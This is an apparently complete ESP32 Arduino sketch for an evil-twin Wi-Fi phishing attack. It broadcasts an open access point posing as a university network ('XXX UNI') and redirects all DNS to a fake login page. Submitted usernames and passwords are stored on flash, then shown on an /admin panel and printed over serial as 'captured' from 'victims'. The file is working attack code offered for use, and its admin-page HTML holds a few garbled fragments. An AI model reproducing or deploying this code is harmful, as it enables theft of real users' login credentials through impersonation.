#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>

const char* evil_ssid = "XXX UNI";
const char* ap_password = "";
const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);

const char* success_page = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>XXX - Connected</title>
    <meta http-equiv="refresh" content="2; url=http://google.com">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #0f3460 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .success-card {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        .success-card h2 {
            color: #28a745;
            margin-bottom: 10px;
        }
        .success-card p {
            color: #666;
        }
        .spinner {
            margin-top: 20px;
            width: 30px;
            height: 30px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0f3460;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: inline-block;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="success-card">
        <h2>✓ Authentication Successful!</h2>
        <p>Welcome to XXX Network</p>
        <p>Redirecting to internet...</p>
        <div class="spinner"></div>
    </div>
</body>
</html>
)rawliteral";

// HTML login page
const char* login_page = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>XXX | Login Portal</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(145deg, #e0eafc 0%, #cfdef3 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
    }

    .login-card {
      max-width: 460px;
      width: 100%;
      background: #ffffff;
      border-radius: 2rem;
      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25), 0 8px 18px rgba(0, 0, 0, 0.05);
      overflow: hidden;
      transition: transform 0.2s ease;
    }

    .login-card:hover {
      transform: translateY(-3px);
    }

    .card-inner {
      padding: 2rem 2rem 2.25rem;
    }

    .uni-header {
      text-align: center;
      margin-bottom: 1.75rem;
    }

    .uni-name {
      font-size: 2.2rem;
      font-weight: 700;
      letter-spacing: -0.02em;
      background: linear-gradient(135deg, #1e2b3c, #1f4e6e);
      background-clip: text;
      -webkit-background-clip: text;
      color: transparent;
      margin-bottom: 0.5rem;
      text-transform: uppercase;
    }

    .welcome-tag {
      display: flex;
      justify-content: space-between;
      align-items: baseline;
      flex-wrap: wrap;
      gap: 8px;
      margin-top: 6px;
      border-top: 1px solid #eef2f8;
      padding-top: 1rem;
    }

    .welcome-text {
      font-size: 1.3rem;
      font-weight: 600;
      color: #1f3b4c;
      letter-spacing: -0.2px;
    }

    .lang-selector {
      background: #f0f4fa;
      border-radius: 40px;
      padding: 0.35rem 0.9rem;
      font-size: 0.85rem;
      font-weight: 500;
      color: #22668d;
      cursor: default;
      display: inline-flex;
      align-items: center;
      gap: 6px;
      transition: background 0.2s;
    }

    .lang-selector span {
      font-size: 1rem;
    }

    .input-group {
      margin-bottom: 1.5rem;
    }

    .input-label {
      display: block;
      font-size: 0.85rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      color: #4a627a;
      margin-bottom: 0.5rem;
    }

    .input-field {
      width: 100%;
      padding: 0.9rem 1rem;
      font-size: 1rem;
      font-family: 'Inter', monospace;
      border: 1.5px solid #e2e8f0;
      border-radius: 1.25rem;
      background: #fefefe;
      transition: all 0.2s ease;
      outline: none;
      color: #0f2b38;
      font-weight: 500;
    }

    .input-field:focus {
      border-color: #2c7da0;
      box-shadow: 0 0 0 3px rgba(44, 125, 160, 0.2);
      background: #ffffff;
    }

    .password-wrapper {
      position: relative;
    }

    .login-btn {
      width: 100%;
      background: #1f5e7e;
      border: none;
      padding: 0.9rem 1rem;
      border-radius: 2rem;
      font-size: 1.05rem;
      font-weight: 700;
      color: white;
      font-family: 'Inter', sans-serif;
      letter-spacing: 0.3px;
      cursor: pointer;
      transition: all 0.25s ease;
      margin-top: 0.5rem;
      margin-bottom: 1.5rem;
      box-shadow: 0 8px 18px -8px rgba(31, 94, 126, 0.4);
    }

    .login-btn:hover {
      background: #0f4b68;
      transform: scale(0.98);
      box-shadow: 0 4px 12px -6px rgba(31, 94, 126, 0.5);
    }

    .extra-links {
      text-align: center;
      font-size: 0.8rem;
      color: #5f7f9a;
      border-top: 1px solid #ecf3f9;
      padding-top: 1.2rem;
      margin-top: 0.2rem;
    }

    .extra-links a {
      color: #22668d;
      text-decoration: none;
      font-weight: 500;
      transition: color 0.2s;
    }

    .extra-links a:hover {
      color: #0f3b50;
      text-decoration: underline;
    }

    .demo-hint {
      background: #f8fafd;
      border-radius: 1rem;
      padding: 0.6rem;
      text-align: center;
      font-size: 0.7rem;
      margin-top: 1rem;
      color: #4b6f8c;
    }

    @media (max-width: 480px) {
      .card-inner {
        padding: 1.5rem;
      }
      .uni-name {
        font-size: 1.8rem;
      }
      .welcome-text {
        font-size: 1.1rem;
      }
      .lang-selector {
        font-size: 0.75rem;
        padding: 0.25rem 0.7rem;
      }
    }
  </style>
</head>
<body>
  <div class="login-card">
    <div class="card-inner">
      <div class="uni-header">
        <div class="uni-name">XXX UNI</div>
        <div class="welcome-tag">
          <span class="welcome-text">Welcome</span>
          <div class="lang-selector">
            <span>🌐</span> English
          </div>
        </div>
      </div>

      <form id="loginForm" action="/submit" method="POST">
        <div class="input-group">
          <label class="input-label" for="username">Username</label>
          <input type="text" id="username" name="username" class="input-field" placeholder="student / staff id" autocomplete="username" required>
        </div>

        <div class="input-group">
          <label class="input-label" for="password">Password</label>
          <div class="password-wrapper">
            <input type="password" id="password" name="password" class="input-field" placeholder="••••••••" autocomplete="current-password" required>
          </div>
        </div>

        <button type="submit" class="login-btn">Login</button>
      </form>

      <div class="extra-links">
        <a href="#" id="forgotLink">Forgot password?</a> &nbsp;|&nbsp;
        <a href="#" id="registerLink">New user? Apply</a>
      </div>

      <div class="demo-hint">
        ⚡ Secure Wi-Fi Access | For authorized users only
      </div>
    </div>
  </div>
</body>
</html>
)rawliteral";

void save_credentials(String user, String pass) {
  Serial.println("\n╔════════════════════════════════╗");
  Serial.println("║     NEW CREDENTIALS CAPTURED   ║");
  Serial.println("╠════════════════════════════════╣");
  Serial.print("║ Username: ");
  Serial.print(user);
  Serial.println("║");
  Serial.print("║ Password: ");
  Serial.print(pass);
  Serial.println("║");
  Serial.println("╚════════════════════════════════╝");
  
  if (SPIFFS.begin(true)) {
    File file = SPIFFS.open("/creds.txt", FILE_APPEND);
    if (file) {
      file.print("User: ");
      file.print(user);
      file.print(" | Pass: ");
      file.println(pass);
      file.close();
    }
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n[+] ESP32 Evil Twin Started");
  
  SPIFFS.begin(true);
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(evil_ssid, ap_password);
  Serial.print("[+] Fake AP: ");
  Serial.println(evil_ssid);
  Serial.print("[+] IP: ");
  Serial.println(WiFi.softAPIP());
  
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  server.on("/", []() { server.send(200, "text/html", login_page); });
  
  server.on("/submit", HTTP_POST, []() {
    String user = server.arg("username");
    String pass = server.arg("password");
    save_credentials(user, pass);
    server.send(200, "text/html", success_page);
  });
  
  server.on("/admin", []() {
    String html = "<!DOCTYPE html><html><head><title>Admin - Credentials</title>";
    html += "<style>body{font-family:monospace;padding:20px;background:#1a1a2e;color:white;}";
    html += "table{width:100%;border-collapse:collapse;background:#16213e;}";
    html += "th,td{border:1px solid #0f3460;padding:10px;text-align:left;}";
    html += "th{background:#0f3460;}";
    html += ".count{background:#28a745;padding:10px;border-radius:10px;display:inline-block;}</style>";
    html += "</head><body><h1>📋 Captured Credentials</h1>";
    
    int count = 0;
    if (SPIFFS.begin(true) && SPIFFS.exists("/creds.txt")) {
      File file = SPIFFS.open("/creds.txt", FILE_READ);
      html += "<table border='1'>规矩<th>#</th><th>Username</th><th>Password</th></tr>";
      while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.length() > 0) {
          count++;
          int userStart = line.indexOf("User: ") + 6;
          int userEnd = line.indexOf(" | Pass:");
          int passStart = line.indexOf("Pass: ") + 6;
          String user = line.substring(userStart, userEnd);
          String pass = line.substring(passStart);
          html += "<tr><td>" + String(count) + "</td><td>" + user + "</td><td>" + pass + "NonNull</tr>";
        }
      }
      file.close();
      html += "</table>";
      html += "<div class='count'>📊 Total: " + String(count) + " credentials captured</div>";
    } else {
      html += "<p>⚠️ No credentials captured yet. Connect to the fake Wi-Fi first.</p>";
    }
    
    html += "<br><br><a href='/admin' style='background:#0f3460;padding:10px 20px;color:white;text-decoration:none;border-radius:5px;'>🔄 Refresh</a>";
    html += " <a href='/clear' style='background:#dc3545;padding:10px 20px;color:white;text-decoration:none;border-radius:5px;' onclick='return confirm(\"Clear all credentials?\")'>🗑️ Clear All</a>";
    html += "</body></html>";
    server.send(200, "text/html", html);
  });
  
  server.on("/clear", []() {
    if (SPIFFS.begin(true)) {
      SPIFFS.remove("/creds.txt");
      server.send(200, "text/html", "<h1>✅ All credentials cleared!</h1><a href='/admin'>Back to Admin</a>");
    }
  });
  
  server.onNotFound([]() { server.send(200, "text/html", login_page); });
  
  server.begin();
  Serial.println("[+] Web server started");
  Serial.println("[+] Admin panel: http://" + WiFi.softAPIP().toString() + "/admin");
  Serial.println("[+] Waiting for victims...\n");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  if (Serial.available()) {
    char cmd = Serial.read();
    if (cmd == 'c') {
      Serial.println("\n=== CREDENTIALS FROM FILE ===");
      if (SPIFFS.begin(true) && SPIFFS.exists("/creds.txt")) {
        File file = SPIFFS.open("/creds.txt", FILE_READ);
        while (file.available()) {
          Serial.println(file.readStringUntil('\n'));
        }
        file.close();
      } else {
        Serial.println("No credentials yet");
      }
      Serial.println("================================\n");
    }
  }
  
  static unsigned long lastPrint = 0;
  if (millis() - lastPrint > 15000) {
    Serial.print("[+] Connected clients: ");
    Serial.println(WiFi.softAPgetStationNum());
    lastPrint = millis();
  }
}
